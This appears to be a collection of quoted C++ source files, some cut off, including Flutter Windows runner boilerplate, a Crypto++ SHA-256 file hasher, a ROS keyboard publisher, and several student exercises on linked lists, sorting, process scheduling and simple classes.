    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sha.h>\n#include <hex.h>\n#include <files.h>\n#include <locale.h>\n\nusing namespace std;\nusing namespace CryptoPP;\n\nnamespace SHA_Algorithm\n{\n    string calculateFileHash(const string& filename)\n    {\n        SHA256 sha256;\n        string hash;\n\n        ifstream file(filename, ios::binary); // se n\u00e3o abrir no modo bin\u00e1rio n\u00e3o funciona direito\n        if (!file)\n        {\n            cerr << \"Erro ao abrir o arquivo '\" << filename << \"'\" << endl;\n            return \"\";\n        }\n\n        file.seekg(0, ios::end);\n        size_t fileSize = file.tellg();\n        file.seekg(0, ios::beg);\n\n        const size_t maxBufferSize = 65536;\n        size_t bufferSize = min(maxBufferSize, fileSize);\n        char* buffer = new char[bufferSize];\n\n        HashFilter filter(sha256);\n        filter.Attach(new HexEncoder(new StringSink(hash)));\n\n        while (file.read(buffer, bufferSize))\n        {\n            filter.Put(reinterpret_cast<CryptoPP::byte*>(buffer), bufferSize);\n        }\n        filter.Put(reinterpret_cast<CryptoPP::byte*>(buffer), file.gcount());\n        filter.MessageEnd();\n\n        delete[] buffer;\n        file.close();\n\n        return hash;\n    }\n    bool compareFiles(const string& first_file_name, const string& second_file_name)\n    {\n        return calculateFileHash(first_file_name) == calculateFileHash(second_file_name) ? true : false;\n    }\n};\n\ninline void crypto_info(void)\n{\n    cout << \"*******************************\\n\";\n    cout << \"* SHA - Secure Hash Algorithm *\\n\";\n    cout << \"*******************************\\n\\n\";\n}\n\nvoid menu(void)\n{\n    crypto_info();\n    cout << \"1 - Gerar Hash de um arquivo\\n\";\n    cout << \"2 - Comparar conte\u00fado de arquivos \\n\";\n    cout << \"3 - Sair\\n\";\n    cout << \":\";\n}\n\n\nint main(void)\n{\n       setlocale(LC_ALL, \"Portuguese\");\n   string filename;\n   short int option;\n\n    while (1)\n    {\n        menu();\n        cin >> option;\n        if (cin.fail()) exit(EXIT_FAILURE);\n\n        switch (option)\n        {\n            case 1:\n            {\n                try\n                {\n                    system(\"cls\");\n                    crypto_info();\n                    cout << \"\\n\\nDigite o nome do arquivo: \";\n                    cin >> filename;\n                    ofstream output_file(\"File_Hash.txt\");\n                    output_file << SHA_Algorithm::calculateFileHash(filename);\n                    cout << \"\\n\\nHash do arquivo \" << filename << \" gerado com sucesso!\\n\\n\";\n                }\n                catch (const std::exception& ex)\n                {\n                    cerr << \"\\n\\nErro: \" << ex.what() << \"\\n\\n\";\n                }\n            }\n            break;\n            case 2:\n            {\n                try\n                {\n                    string first, second;\n                    system(\"cls\");\n                    crypto_info();\n                    cout << \"\\n\\nDigite o nome do primeiro arquivo: \";\n                    cin >> first;\n                    cout << \"\\n\\nDigite o nome do segundo arquivo: \";\n                    cin >> second;\n\n                    if (SHA_Algorithm::compareFiles(first,second))\n                    {\n                        cout << \"\\n\\n Os Arquivos s\u00e3o iguais!\\n\\n\";\n                    }\n                    else\n                    {\n                        cout << \"\\n\\n Os Arquivos n\u00e3o s\u00e3o iguais!\\n\\n\";\n                    }\n                }\n                catch (const std::exception& ex)\n                {\n                    cerr << \"\\n\\nErro: \" << ex.what() << \"\\n\\n\";\n                }\n            }\n            break;\n            case 3:\n            {\n                exit(EXIT_FAILURE);\n            }\n            default:\n            {\n                exit(EXIT_FAILURE);\n            }\n        }\n        system(\"pause\");\n        system(\"cls\");\n    }\n    return 0;\n}\n",
    "#include<iostream>\r\n#include<string>\r\nusing namespace std;\r\n\r\nclass Node {\r\npublic:\r\n    string productId;\r\n    string productName;\r\n    string productPrice;\r\n    Node* next;\r\n\r\n    Node(string id, string name, string price) \r\n\t{\r\n        productId = id;\r\n        productName = name;\r\n        productPrice = price;\r\n        next = NULL; \r\n    }\r\n};\r\n\r\nclass ProductList {\r\nprivate:\r\n    Node* head;\r\n\r\npublic:\r\n    ProductList() \r\n\t{\r\n        head = NULL; \r\n    }\r\n\r\n    ~ProductList() \r\n\t{\r\n        Node* current = head;\r\n        while (current != NULL) \r\n\t\t{\r\n            Node* next = current->next;\r\n            delete current;\r\n            current = next;\r\n        }\r\n        head = NULL;\r\n    }\r\n    void displayProducts() \r\n\t\r\n\t{\r\n        cout << \"\\nProduct List\\n\";\r\n        cout << \"ID\\tName\\tPrice\\n\";\r\n        Node* current = head;\r\n        while (current != NULL) \r\n\t\t{\r\n            cout << current->productId << \"\\t\" << current->productName << \"\\t\" << current->productPrice << endl;\r\n            current = current->next;\r\n        }\r\n        cout << endl;\r\n    }\r\n    void insertProduct(int pos, Node* newProduct) \r\n\t{\r\n        if (pos == 0) \r\n\t\t{\r\n            newProduct->next = head;\r\n            head = newProduct;\r\n        } else \r\n\t\t{\r\n            Node* temp = head;\r\n            for (int i = 0; i < pos - 1 && temp != NULL; ++i) \r\n\t\t\t{\r\n                temp = temp->next;\r\n            }\r\n            if (temp != NULL) \r\n\t\t\t{\r\n                newProduct->next = temp->next;\r\n                temp->next = newProduct;\r\n            } else \r\n\t\t\t{\r\n                cout << \"Invalid position\\n\";\r\n            }\r\n        }\r\n        cout << \"Product inserted at position \" << pos << \"\\n\";\r\n    }\r\n\r\n    void deleteProduct(int pos) \r\n\t{\r\n        if (head == NULL) \r\n\t\t{\r\n            cout << \"List is empty\\n\";\r\n            return;\r\n        }\r\n        Node* temp = head;\r\n        if (pos == 0) \r\n\t\t{\r\n            head = head->next;\r\n            delete temp;\r\n        } else \r\n\t\t{\r\n            for (int i = 0; temp != NULL && i < pos - 1; ++i) \r\n\t\t\t{\r\n                temp = temp->next;\r\n            }\r\n            if (temp != NULL && temp->next != NULL) \r\n\t\t\t{\r\n                Node* nextNode = temp->next->next;\r\n                delete temp->next;\r\n                temp->next = nextNode;\r\n            } else \r\n\t\t\t{\r\n                cout << \"Invalid position\\n\";\r\n            }\r\n        }\r\n        cout << \"Product deleted from position \" << pos << \"\\n\";\r\n    }\r\n};\r\n\r\nint main() {\r\n    ProductList productList;\r\n\r\n    int choice, pos;\r\n    string id, name, price;\r\n\r\n    while (true) {\r\n        cout << \"\\nProduct Management System\\n\";\r\n        cout << \"1. Display Products\\n\";\r\n        cout << \"2. Insert Product\\n\";\r\n        cout << \"3. Delete Product\\n\";\r\n        cout << \"4. Exit\\n\";\r\n        cout << \"Enter your choice \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                productList.displayProducts();\r\n                break;\r\n            case 2:\r\n                cout << \"Enter the position to insert \";\r\n                cin >> pos;\r\n                cout << \"Enter Product ID \";\r\n                cin >> id;\r\n                cout << \"Enter Product Name \";\r\n                cin >> name;\r\n                cout << \"Enter Product Price \";\r\n                cin >> price;\r\n                productList.insertProduct(pos, new Node(id, name, price));\r\n                break;\r\n            case 3:\r\n                cout << \"Enter the position to delete \";\r\n                cin >> pos;\r\n                productList.deleteProduct(pos);\r\n                break;\r\n            case 4:\r\n                cout << \"Exit\\n\";\r\n                return 0;\r\n            default:\r\n                cout << \"Invalid choice\\n\";\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <termios.h>\n#include <unistd.h>\n#include \"ros/ros.h\"\n#include \"std_msgs/String.h\"\n\n\nchar get_keyboard() {\n    // Read a single character.\n    char c = 0;\n    std::cin >> c;\n    return c;\n}\n\nint main(int argc, char **argv)\n{\n    ros::init(argc, argv, \"read_keyboard\");\n    ros::NodeHandle n;\n    ros::Publisher chatter_pub = n.advertise<std_msgs::String>(\"keyboard\", 10);\n    ros::Rate loop_rate(100);\n    std::cout << \"start read keyboard\" << std::endl;\n\n    // Retrieve the properties of the standard input stream.\n    struct termios oldt, newt;\n    tcgetattr(STDIN_FILENO, &oldt);\n    newt = oldt;\n\n    // Set unbuffered mode.\n    newt.c_lflag &= ~(ICANON | ECHO);\n    tcsetattr(STDIN_FILENO, TCSANOW, &newt);\n\n    while (ros::ok()) {\n        /**\n         * This is a message object. You stuff it with data, and then publish it.\n         */\n        std_msgs::String msg;\n\n        char c = get_keyboard();\n        msg.data = c;\n\n        chatter_pub.publish(msg);\n\n        ros::spinOnce();\n\n        loop_rate.sleep();\n    }\n\n    // Restore the properties of the standard input stream.\n    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nint FindSmallest(int arr[], int start, int size) {\n    int smallest = arr[start];\n    int smallest_index = start;\n\n    for (int i = start + 1; i < size; i++) {\n        if (arr[i] < smallest) {\n            smallest = arr[i];\n            smallest_index = i;\n        }\n    }\n    return smallest_index;\n}\n\n\nvector<int> SelectionSort(int arr[], int size) {\n    vector<int> newArr;\n    for (int i = 0; i < size; i++) {\n        int smallest = FindSmallest(arr, i, size);\n        newArr.push_back(arr[smallest]);\n\n        // Swap the smallest element with the first unsorted element\n        int temp = arr[i];\n        arr[i] = arr[smallest];\n        arr[smallest] = temp;\n    }\n    return newArr;\n}\n\nint main()\n{\n\n    int arr[] = { 5,3,6,2,10 };\n    int n = sizeof(arr) / sizeof(arr[0]);\n\n    cout << \"Original array: \";\n    for (int i = 0; i < n; i++) {\n        cout << arr[i] << \" \";\n    }\n    cout << endl;\n\n    vector<int> sortedArr = SelectionSort(arr, n);\n\n    cout << \"Sorted array: \";\n    for (int i = 0; i < sortedArr.size(); i++) {\n        cout << sortedArr[i] << \" \";\n    }\n    cout << endl;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nstruct process {\r\n    string name;\r\n    int brusttime;\r\n    int waitingtime;\r\n    int turnaroundtime;\r\n};\r\n\r\nint main() {\r\n    int numprocesses;\r\n    cout << \"Enter the number of processes: \";\r\n    cin >> numprocesses;\r\n\r\n    vector<process> processes(numprocesses);\r\n\r\n    for (int i = 0; i < numprocesses; i++) {\r\n        cout << \"Enter burst time for process \" << (i + 1) << \": \";\r\n        cin >> processes[i].brusttime;\r\n        processes[i].name = \"p\" + to_string(i + 1);\r\n        processes[i].waitingtime = 0;\r\n        processes[i].turnaroundtime = 0;\r\n    }\r\n\r\n    for (int i = 1; i < numprocesses; i++) {\r\n        processes[i].waitingtime = processes[i - 1].waitingtime + processes[i - 1].brusttime;\r\n        processes[i].turnaroundtime = processes[i].waitingtime + processes[i].brusttime;\r\n    }\r\n\r\n    double avgwaitingtime = 0, avgturnaroundtime = 0;\r\n    for (int i = 0; i < numprocesses; i++) {\r\n        avgwaitingtime += processes[i].waitingtime;\r\n        avgturnaroundtime += processes[i].turnaroundtime;\r\n    }\r\n\r\n    avgwaitingtime /= numprocesses;\r\n    avgturnaroundtime /= numprocesses;\r\n\r\n    cout << \"Process\\tBurst Time\\tWaiting Time\\tTurnaround Time\\n\";\r\n    for (int i = 0; i < numprocesses; i++) {\r\n        cout << processes[i].name << \"\\t\" << processes[i].brusttime << \"\\t\\t\"\r\n             << processes[i].waitingtime << \"\\t\\t\" << processes[i].turnaroundtime << \"\\n\";\r\n    }\r\n\r\n    cout << \"\\nAverage Waiting Time: \" << avgwaitingtime << \"\\n\";\r\n    cout << \"Average Turnaround Time: \" << avgturnaroundtime << \"\\n\";\r\n\r\n    return 0;\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nclass Book {\npublic:\n    string title;\n    string author;\n\n    Book(string t, string a)\n    {\n        title = t;\n        author = a;\n    }\n};\n\nclass Library {\nprivate:\n    static const int Max_Books = 100;\n    Book* books[Max_Books];\n    int num_books;\n\npublic:\n    Library()\n    {\n        num_books = 0;\n   \n    }\n\n    void add_book(Book* book) {\n        if (num_books < Max_Books) {\n            books[num_books++] = book;\n        }\n        else {\n            cout << \"Library is full!\" << endl;\n        }\n    }\n\n    void remove_book(Book* book) {\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i] == book) {\n             \n                books[i] = books[num_books - 1];\n                num_books--;\n                cout << \"Book removed from the library.\" << endl;\n                return;\n            }\n        }\n        cout << \"Book not found in the library.\" << endl;\n    }\n\n    void search_by_title(string title) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->title == title) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"No books found with the given title.\" << endl;\n        }\n    }\n\n    void search_by_author(string author) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->author == author) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"This Author has not written any book.\" << endl;\n        }\n    }\n  \n};\n\nint main() {\n    Library library;\n\n    Book book1(\"Object Oriented Programming\", \"Tonny Gaddis\");\n    Book book2(\"C++ by Me\", \"Mr Abdullah\");\n\n    library.add_book(&book1);\n    library.add_book(&book2);\n\n    cout << \"Books by title:\" << endl;\n    library.search_by_title(\"Object Oriented Programming\");\n\n    cout << \"\\nBooks by author:\" << endl;\n    library.search_by_author(\"Mr Abdullah\");\n\n    cout << \"\\nRemoving a book...\" << endl;\n    library.remove_book(&book1);\n\n    return 0;\n}\n",
    "\ufeff// Homework01.04.2024-Classes.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\nusing namespace std;\n\nclass Dog \n{\npublic:\n    string name;\n    string color;\n    string bread;\n    string favorite_food;\n    double weight = 0;\n\n    void Bark()\n    {\n        cout << bread << name << \" : \" <<  \"GAV-GAV...\\n\";\n    }\n    void Growl()\n    {\n        cout << bread << name << \" : \" << \"R-R-R-R-R-R...\\n\";\n    }\n    void Walk()\n    {\n        cout << \" loves to walk in the park,\";\n    }\n    void Eat()\n    {\n        cout << bread << name << \" love eat \" << favorite_food << \".\\n\";\n    }\n    void Sleep()\n    {\n        cout <<  bread << name << \" went to sleep.\\n\";\n    }\n};\n\nclass PowerBank\n{\npublic:\n    string brand;\n    string color;\n    int quantity_ports = 0;\n    double capacity = 0;\n    bool Type_C = false;\n    bool USB = false;\n    bool Micro_USB = false;\n    bool charg = false;\n\n    void Charging()\n    {\n        if ((Type_C || Micro_USB) && !USB && charg)\n        {\n            cout << \"Power bank charge the device.\\n\";\n        }\n        else if (USB)\n        {\n            cout << \"Power bank charging.\\n\";\n        }\n    }\n    void  PowerBankInfo()\n    {\n        cout << \"Power Bank Info:\\n\";\n        cout << \"\\t\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\t\\tColor: \" << color << \"\\n\";\n        cout << \"\\t\\tQuantity USB-ports: \" << quantity_ports << \"\\n\";\n        cout << \"\\t\\tCapacity: \" << capacity << \" mA/h\\n\";\n        if (Type_C)\n        {\n            cout << \"\\t\\tHave Type C-port \\n\";\n        }\n        if (Micro_USB)\n        {\n            cout << \"\\t\\tHave Micro USB-port \\n\";\n        }\n    }\n};\n\nclass Mouse\n{\npublic:\n    string brand;\n    string model;\n    string color;\n    bool wireless = false;\n    bool left_button = false;\n    bool right_button = false;\n    bool scrol = false;\n\n    void Press_left_button()\n    {\n        if (left_button)\n        {\n            cout << \"Perform an action.\\n\";\n        }\n        \n    }\n    void Press_right_button()\n    {\n        if (right_button)\n        {\n            cout << \"Show context menu.\\n\";\n        }\n    }\n    void Scrol()\n    {\n        if (scrol)\n        {\n            cout << \"Scroll....scrol...scrol...scrol...\\n\";\n        }\n    }\n    void MouseInfo()\n    {\n        cout << \"Mouse Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n        if (wireless)\n        {\n            cout << \"\\tWired or wireless:  wireless.\\n\";\n        }\n        else\n        {\n            cout << \"\\tWired or wireless:  wired.\\n\";\n        }\n    }\n};\n\nclass TV\n{\npublic:\n    string brand;\n    string model;\n    double diagonal = 0;\n    string color;\n\n    void TVInfo() \n   